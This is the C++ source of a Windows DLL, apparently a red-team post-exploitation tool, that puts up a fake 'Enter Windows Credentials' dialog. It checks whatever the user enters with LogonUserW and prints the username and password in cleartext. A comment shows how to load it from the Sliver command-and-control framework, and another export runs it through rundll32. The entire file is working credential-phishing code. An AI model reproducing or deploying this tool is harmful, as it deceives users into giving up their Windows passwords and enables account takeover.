#include "pch.h"
#include <windows.h>
#include <commctrl.h>
#include <wincred.h>
#include <iostream>
#include <stdio.h>
#include <errno.h>

#pragma comment(lib, "comctl32.lib")
#pragma comment(lib, "Credui.lib")

BOOL APIENTRY DllMain(HMODULE hModule,
	DWORD  ul_reason_for_call,
	LPVOID lpReserved
)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}
	return TRUE;
}

void askForCreds(DWORD maxTries) {

	BOOL loginStatus = FALSE;
	DWORD numTries = 0;

	while ((loginStatus == FALSE) && (numTries < maxTries)) {
		numTries += 1;

		CREDUI_INFOW uiInfo = {};
		uiInfo.cbSize = sizeof(uiInfo);
		uiInfo.hwndParent = nullptr;
		uiInfo.pszCaptionText = L"Enter Windows Credentials";
		uiInfo.pszMessageText = L"Enter your credentials to proceed:"; // optional
		uiInfo.hbmBanner = nullptr;

		ULONG authPackage = 0;
		LPVOID authBuffer = nullptr;
		ULONG ulAuthBufferSize = 0;
		BOOL fSave = false;
		DWORD dwAuthError = 0;
		dwAuthError = CredUIPromptForWindowsCredentialsW(
			&uiInfo,
			0,
			&authPackage,
			nullptr,
			0,
			&authBuffer,
			&ulAuthBufferSize,
			&fSave,
			CREDUIWIN_ENUMERATE_CURRENT_USER
		);

		if (dwAuthError == ERROR_SUCCESS) {
			WCHAR pszUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxUserName = CREDUI_MAX_USERNAME_LENGTH + 1;
			WCHAR pszDomainName[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxDomainName = CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1;
			WCHAR pszPassword[CREDUI_MAX_PASSWORD_LENGTH * sizeof(WCHAR)];
			DWORD dwMaxPassword = CREDUI_MAX_PASSWORD_LENGTH + 1;
			CredUnPackAuthenticationBufferW(
				CRED_PACK_PROTECTED_CREDENTIALS,
				authBuffer,
				ulAuthBufferSize,
				pszUserName,
				&dwMaxUserName,
				pszDomainName,
				&dwMaxDomainName,
				pszPassword,
				&dwMaxPassword
			);

			WCHAR parsedUserName[CREDUI_MAX_USERNAME_LENGTH * sizeof(WCHAR)];
			WCHAR parsedDomain[CREDUI_MAX_DOMAIN_TARGET_LENGTH * sizeof(WCHAR)];
			CredUIParseUserNameW(
				pszUserName,
				parsedUserName,
				CREDUI_MAX_USERNAME_LENGTH + 1,
				parsedDomain,
				CREDUI_MAX_DOMAIN_TARGET_LENGTH + 1
			);

			HANDLE handle = nullptr;
			loginStatus = LogonUserW(
				parsedUserName,
				parsedDomain,
				pszPassword,
				LOGON32_LOGON_NETWORK,
				LOGON32_PROVIDER_DEFAULT,
				&handle
			);

			if (loginStatus == TRUE) {
				CloseHandle(handle);
				fwprintf(stdout, L"Correct credentials: %s:%s\n", pszUserName, pszPassword);
				break;
			}
			else {
				fwprintf(stdout, L"Wrong credentials: %s:%s\n", pszUserName, pszPassword);
			}
		}
	}
}

// call from Sliver: 'sideload --entry-point RunMyCode PasswordPrompt.dll "3"'
extern "C"
__declspec(dllexport)
VOID RunMyCode(LPSTR arg)
{
	errno = 0;
	DWORD maxTries = strtol(arg, NULL, 10);
	if (errno != 0 || maxTries == 0) {
		maxTries = 10; // default for no or erroneous argument
	}
	fwprintf(stdout, L"Asking for credentials at most %d times\n", maxTries);

	askForCreds(maxTries);

	fflush(stdout);
}

FILE* stream;

// call locally: 'rundll32.exe PasswordPrompt.dll RunWithRunDLL32 3'
extern "C"
__declspec(dllexport)
VOID RunWithRunDLL32(HWND hwnd, HINSTANCE hinst, LPSTR lpszCmdLine, int nCmdShow)
{
	if (!AttachConsole(ATTACH_PARENT_PROCESS))
		return;

	if (_fileno(stdout) < 0)
		freopen_s(&stream, "CONOUT$", "w", stdout);

	RunMyCode(lpszCmdLine);
}